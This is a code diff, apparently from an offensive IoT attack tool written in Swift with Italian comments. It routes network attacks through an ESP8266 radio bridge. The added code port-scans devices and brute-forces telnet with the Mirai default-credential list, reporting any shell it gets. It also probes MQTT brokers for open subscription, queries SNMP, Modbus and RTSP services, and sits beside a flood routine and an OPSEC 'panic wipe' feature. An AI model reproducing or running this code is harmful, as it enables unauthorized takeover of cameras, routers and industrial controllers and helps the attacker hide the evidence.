@@ -209,6 +209,15 @@ final class Orchestrator: ObservableObject {
     }
 
     private func collectPorts(host: String) async -> (ports: [String], banners: String) {
+        if tcpBridge.connected {
+            let found = await tcpBridge.portScan(host: host, ports: [23, 80, 161, 502, 554, 1883, 5683, 8080, 9100])
+            let ports = found.map { String($0.0) }
+            let banners = found.filter { !$0.1.isEmpty }
+                .map { "\($0.0): \($0.1.prefix(100))" }
+                .joined(separator: " | ")
+            log("port scan via bridge \(host): [\(ports.joined(separator: ","))]", ports.isEmpty ? .warn : .good)
+            return (ports, banners)
+        }
         var ports: [String] = []
         var banners: [String] = []
         await withCheckedContinuation { (c: CheckedContinuation<Void, Never>) in
@@ -478,6 +487,41 @@ final class Orchestrator: ObservableObject {
         ISO8601DateFormatter().string(from: Date())
     }
 
+    // MARK: exec net via radio ESP8266 (payload builders esistenti, esecuzione dal bridge)
+
+    private func bridgeRT(_ host: String, _ port: UInt16, _ payload: Data, udp: Bool = false, timeout: TimeInterval = 4) async -> Data? {
+        await tcpBridge.roundTrip(host: host, port: Int(port), payload: [UInt8](payload), udp: udp, timeout: timeout)
+    }
+
+    private func bridgeMQTT(_ host: String) async -> String {
+        let ack = await bridgeRT(host, 1883, mqttConnectPacket(), timeout: 5)
+        guard let ack, ack.first == 0x20 else {
+            return "CONNECT via bridge — CONNACK non ricevuto (muto o auth richiesta)"
+        }
+        let msgs = await bridgeRT(host, 1883, mqttSubscribePacket(), timeout: 6) ?? Data()
+        return "CONNACK OK via bridge — broker APERTO (no auth). SUBSCRIBE # → \(msgs.isEmpty ? "(silenzio, broker scrivibile)" : String(decoding: msgs.prefix(600), as: UTF8.self))"
+    }
+
+    private func bridgeTelnet(_ host: String) async -> String {
+        let creds: [(String, String)] = [("root", "xc3511"), ("root", "vizxv"), ("admin", "admin"),
+                                         ("root", "root"), ("admin", "1234"), ("root", "1234")]
+        for (u, p) in creds {
+            let r = await bridgeRT(host, 23, Data("\(u)\n\(p)\n".utf8), timeout: 4)
+            if let r, let s = String(data: r, encoding: .utf8),
+               s.contains("#") || s.contains("$") || s.contains("BusyBox") || s.contains("Welcome") {
+                return "SUCCESS via bridge — telnet \(u):\(p) su \(host). Shell: \(s.prefix(250))"
+            }
+        }
+        return "telnet via bridge: tabella Mirai esaurita — nessuna cred valida"
+    }
+
+    private func bridgeUPnP(_ host: String) async -> String {
+        let search = "M-SEARCH * HTTP/1.1\r\nHOST: \(host):1900\r\nMAN: \"ssdp:discover\"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n"
+        let resp = await bridgeRT(host, 1900, Data(search.utf8), udp: true, timeout: 5)
+        guard let resp, !resp.isEmpty else { return "UPnP via bridge: M-SEARCH senza risposta" }
+        return "UPnP via bridge: \(String(decoding: resp, as: UTF8.self).prefix(500))"
+    }
+
     // OPSEC: wipe totale di stato, journal e dump — gesture di panico
     func panicWipe() {
         bridge.stopAll()
@@ -630,31 +674,54 @@ final class Orchestrator: ObservableObject {
             return "flood: \(n) connect cycle completi — target responsivo = \(n < 6 ? "possibile DoS parziale" : "non impattato")"
         case "net_mqtt":
             guard let t = e.target, let host = t.extra["host"] else { return "no host" }
+            if tcpBridge.connected { return await bridgeMQTT(host) }
             return await netMQTT(host)
         case "net_coap":
             guard let t = e.target, let host = t.extra["host"] else { return "no host" }
+            if tcpBridge.connected {
+                let d = await bridgeRT(host, 5683, coapGetWellKnown(), udp: true, timeout: 4)
+                return d.map { "CoAP reply via bridge: \(String(decoding: $0, as: UTF8.self).prefix(500))" }
+                     ?? "nessuna risposta CoAP via bridge — porta chiusa o DTLS richiesto"
+            }
             let req = coapGetWellKnown()
             let r = await udpRoundTrip(host: host, port: 5683, payload: req, timeout: 3)
             return r.isEmpty ? "nessuna risposta CoAP — porta chiusa o DTLS richiesto" : "CoAP reply: \(r.prefix(600))"
         case "net_snmp":
             guard let t = e.target, let host = t.extra["host"] else { return "no host" }
+            if tcpBridge.connected {
+                let d = await bridgeRT(host, 161, snmpGetSysDescr(), udp: true, timeout: 4)
+                return d.map { "SNMP sysDescr via bridge: \(String(decoding: $0, as: UTF8.self).prefix(400))" }
+                     ?? "nessuna risposta SNMP via bridge (community non accettata o UDP filtrato)"
+            }
             let r = await udpRoundTrip(host: host, port: 161, payload: snmpGetSysDescr(), timeout: 3)
             return r.isEmpty ? "nessuna risposta SNMP (community default non accettata o UDP filtrato)"
                              : "SNMP sysDescr: \(r.prefix(400))"
         case "net_modbus":
             guard let t = e.target, let host = t.extra["host"] else { return "no host" }
+            if tcpBridge.connected {
+                let d = await bridgeRT(host, 502, modbusReadHolding(), timeout: 4)
+                return d.map { "Modbus reply via bridge (hex): \($0.map { String(format: "%02x", $0) }.joined().prefix(200))" }
+                     ?? "nessuna risposta Modbus/TCP via bridge"
+            }
             let r = await tcpRoundTrip(host: host, port: 502, payload: modbusReadHolding(), timeout: 3)
             return r.isEmpty ? "nessuna risposta Modbus/TCP" : "Modbus reply (hex): \(r.prefix(200))"
         case "net_rtsp":
             guard let t = e.target, let host = t.extra["host"] else { return "no host" }
             let req = "OPTIONS rtsp://\(host):554/ RTSP/1.0\r\nCSeq: 1\r\n\r\n"
+            if tcpBridge.connected {
+                let d = await bridgeRT(host, 554, Data(req.utf8), timeout: 4)
+                return d.map { "RTSP via bridge: \(String(decoding: $0, as: UTF8.self).prefix(400))" }
+                     ?? "RTSP muto via bridge — porta chiusa"
+            }
             let r = await tcpRoundTrip(host: host, port: 554, payload: req.data(using: .ascii) ?? Data(), timeout: 3)
             return r.isEmpty ? "RTSP muto — porta chiusa" : r.prefix(500).description
         case "net_telnet":
             guard let t = e.target, let host = t.extra["host"] else { return "no host" }
+            if tcpBridge.connected { return await bridgeTelnet(host) }
             return await netTelnet(host)
         case "net_upnp":
             guard let t = e.target, let host = t.extra["host"] else { return "no host" }
+            if tcpBridge.connected { return await bridgeUPnP(host) }
             return await netUPnP(host)
         default:
             return "handler nativo non implementato per \(id) — trattato come PLAN"
